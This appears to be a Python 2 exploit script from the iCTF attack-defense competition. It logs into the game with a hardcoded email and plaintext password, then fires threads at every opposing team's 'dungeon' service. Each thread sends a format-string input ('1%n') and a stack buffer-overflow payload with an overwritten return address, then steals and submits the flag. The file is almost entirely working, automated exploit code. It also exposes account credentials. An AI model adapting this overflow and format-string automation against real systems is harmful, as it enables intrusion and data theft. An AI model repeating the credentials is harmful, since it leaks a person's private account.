from ictf import iCTF
import threading
import sys
from time import sleep
import random
import socket
import re

# Shiny colors
OKBLUE  = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL    = '\033[91m'
ENDC    = '\033[0m'

# Custom recv_unitl.. you know.. for reasons
def recv_until(s, text):
    BUFFER_SIZE = 2048
    data = ""
    loop = True
    while loop:
        tmp = s.recv(BUFFER_SIZE)
        if tmp.find(text) != -1: loop = False
        data += tmp
    return data

# Prepare everything and fire the exploits!!!
def prepare():
    # Get the initial
    ticks = 42;
    # Get iCTF-Foo and login
    ctf     = iCTF()
    team    = ctf.login("dominik.schlecht@hotmail.de", "cupjCQdjednhn4yZ")

    while(True):
        if ticks == team.get_tick_info().get("tick_id"):
            sleep(30)
            print OKBLUE    + "[~] Waiting for TICK"                    + ENDC
        else:
            # Maybe kill threads here..
            # We got a new tick, start the exploits!!1!
            ticks = team.get_tick_info().get("tick_id")

            # holts targets in format:
            #  {'team_name' : "Team name",'ip_address' : "10.7.<team_id>.2",'port' : <int port number>,'flag_id' : "Flag ID to steal"}
            targets = team.get_targets("dungeon")

            # not really needed..
            results = []

            for target in targets.get("targets"):
                # Prevent too many threads (no DoS!!!)
                while 20 < threading.activeCount():
                    sleep(0.1)

                # Create a new thread running an exploit
                thread = exploit(
                            target.get("ip_address"),
                            target.get("port"),
                            target.get("flag_id"),
                            team
                        )
                results.append(thread)
                thread.start()

# Multithreaded class
class exploit(threading.Thread):
    def __init__(self, ip, port, flagID, team):
    	threading.Thread.__init__(self)
    	self.ip = ip
        self.port = port
    	self.flagID = flagID
        self.team   = team

    def run(self):
        # Init the socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))

    	string = ""
    	for i in range(0,80):
    		string = string + "0"
    	string = string + "12340000\xef\xbe\xad\xde"
    	string = string + "123400000000\xbd\x96\x04\x08"


    	data = recv_until(s, "0+16?")
    	print "1:" + data
    	s.send('2016\n')
    	data = recv_until(s, "the east")
    	print "2:"+data
    	s.send('west\n')
    	data = s.recv(16000)
    	data = data.strip()
    	print "3:"+data
    	if data[0] == ',':
    	    s.send('f117\n')
    	elif data[0] == 'd':
    	    s.send('sr71\n')
    	elif data[0] == '_':
    	    s.send('f16\n')
    	s.recv(16000)
    	s.send('east\n')
    	s.recv(16000)
    	s.send('2016\n')
    	data = s.recv(16000)
    	print data
    	s.send('east\n')
    	data = s.recv(16000)
    	print data
    	s.send('\n')
    	data = s.recv(16000)
    	print data
    	s.send('east\n')
    	data = s.recv(16000)
    	print data
    	s.send('\n')
    	data = s.recv(16000)
    	print data
    	s.send('east\n')
    	data = s.recv(16000)
    	print data
    	s.send('1%n\n')
    	data = s.recv(16000)
    	print data
    	s.send('east\n')
    	data = s.recv(16000)
    	print data
    	print "blubb"
    	s.send('kill dragon\n')
    	data = s.recv(16000)
    	print data
    	print "blibb"
    	data = s.recv(16000)
    	print data
    	print string
    	s.send(string+'\n')
    	data = s.recv(16000)
    	print data
    	data = s.recv(16000)
    	print data
    	s.send("get " + self.flagID + "\n")
    	data =s.recv(16000)
    	print data
    	s.close()

        flag = data[-17:-1]
        print flag

        # Submit it!
        # Param needs to be a list
        if flag.startswith("FLG"):
            ret = self.team.submit_flag([flag])
        else:
            ret = "ASDASD"

        for resp in ret:
        	if resp == "correct":
        	    print OKGREEN   + "[+] Submitted flag sucessfully"              + ENDC
        	elif resp == "incorrect":
        	    print FAIL      + "[-] Incorrect flag"                          + ENDC
        	elif resp == "alreadysubmitted" or resp == "notactive":
        	    print WARNING   + "[|] Flag already submitted or not active"    + ENDC
        	elif resp == "toomanyincorrect":
        	    print FAIL      + "[-] Too many incorrect flags"                + ENDC
        	else:
        	    print OKBLUE    + "[~] Magic happening!!!!!"                    + ENDC

# Start here..
if __name__ == '__main__':
    prepare()
